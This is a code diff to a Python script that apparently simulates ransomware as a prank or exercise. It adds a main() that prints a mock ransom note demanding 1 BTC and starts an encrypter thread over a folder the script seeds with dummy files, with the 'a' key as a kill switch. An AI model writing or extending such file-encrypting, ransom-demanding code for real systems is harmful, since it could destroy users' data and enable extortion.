@@ -31,6 +31,25 @@ class EncrypterThread(threading.Thread):
         self._stop = True
 
 
+def main() -> None:
+    print(f"{Fore.RED}*****************************\n"
+          "Ur ass has been hacked >:D\n\n"
+          "Pay 1 BTC to ma vallet or\n"
+          "All ur files wil be encruptad\n"
+          "*****************************\n\n"
+          "Pres ma feyvorit leter for\n"
+          "free unlok\n\n"
+          "*****************************"
+          )
+
+    enc_thread = EncrypterThread(files_path)
+    enc_thread.start()
+    while enc_thread.is_alive():
+        if msvcrt.getch() == b"a":
+            enc_thread.stop()
+            break
+
+
 if __name__ == "__main__":
     colorama.init(autoreset=True)
 
@@ -68,3 +87,4 @@ if __name__ == "__main__":
             f.write("\n".join("som of ur importent info" for _ in range(100)))
 
     clear()
+    main()
